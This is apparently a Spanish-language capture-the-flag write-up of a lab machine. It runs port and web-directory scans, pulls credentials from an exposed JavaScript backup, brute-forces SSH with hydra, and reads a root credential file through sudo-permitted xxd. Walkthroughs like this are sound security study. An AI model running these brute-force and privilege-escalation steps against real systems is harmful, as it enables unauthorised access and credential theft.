## Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 10:16 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 4d:ea:92:ba:53:e3:b8:dc:71:95:50:19:87:6b:b2:6d (ECDSA)
|_  256 fa:77:68:76:dc:8e:b1:cd:56:5f:c1:79:89:ad:fa:78 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: \xC2\xBFQu\xC3\xA9 son las DevTools del Navegador?
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds
```
Puerto 22 y 80 levantados, asi que comienzo chequeando el servicio web

![image](https://github.com/user-attachments/assets/7cf992c0-9d1f-4506-9249-99927cab8a9d)

Solicita credenciales para continuar, asi que aplico fuzzing web 

```ruby
feroxbuster -u 'http://172.17.0.2' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 10
```

```ruby
                                                                                                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git, sh]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 10
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       78l      398w    42336c http://172.17.0.2/4.png
200      GET       22l       72w      765c http://172.17.0.2/backupp.js
200      GET      137l      709w    81631c http://172.17.0.2/3.png
200      GET       77l      401w    45307c http://172.17.0.2/2.png
200      GET      107l      508w    62608c http://172.17.0.2/1.png
200      GET      134l      442w     4548c http://172.17.0.2/
[##>-----------------] - 24s   333209/2491608 3m      found:6       errors:59727  
[######>-------------] - 24s   782712/2491548 32749/s http://172.17.0.2/
```

observo un script .js asi que lo reviso y consigo credenciales

![image](https://github.com/user-attachments/assets/a1e6f13c-97af-4cb6-ac8b-3e6f37ff29e1)

ahora si podria continuar en la web principal

![image](https://github.com/user-attachments/assets/a45b5eda-68e2-4917-b07e-7f0e1271995c)

mas alla de un breve tutorial acerca de `DevTools` no hay mas nada de interes, pero si detallamos el script .js vemos una password antigua, pero al probarla 
con lo que podria ser el user `chocolate` via ssh no son credenciales validas, asi que aplico un ataque de fuerza bruta con hydra al servicio `ssh`


```ruby
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p baluleroh ssh://172.17.0.2
```

![image](https://github.com/user-attachments/assets/c9cb7eeb-588f-4c37-9af3-8a517bc2744a)

obtenemos credenciales para el servicio `ssh`

```ruby
ssh carlos@172.17.0.2
```
![image](https://github.com/user-attachments/assets/ee367390-6436-410c-897a-2f2890870cef)

### Escalada de Privilegios

### carlos

No existen mas usuarios en el sistema, pero vemos que es posible ejecutar el binario `xxd` y `ping` como `root`

![image](https://github.com/user-attachments/assets/2af15905-50ba-4818-bfea-0631f71afa4f)

y tambien observamos una nota que habla de un Backup en el directorio de `root` asi que podria leerlo con el binario `xxd`

```ruby
sudo /usr/bin/xxd /root/data.bak

00000000: 726f 6f74 3a62 616c 756c 6572 6974 6f0a  root:balulerito.
```

obtenemos credenciales para `root` asi que escalamos

![image](https://github.com/user-attachments/assets/39ac37a0-e51a-485e-b620-2b9219b3929a)

### Root


















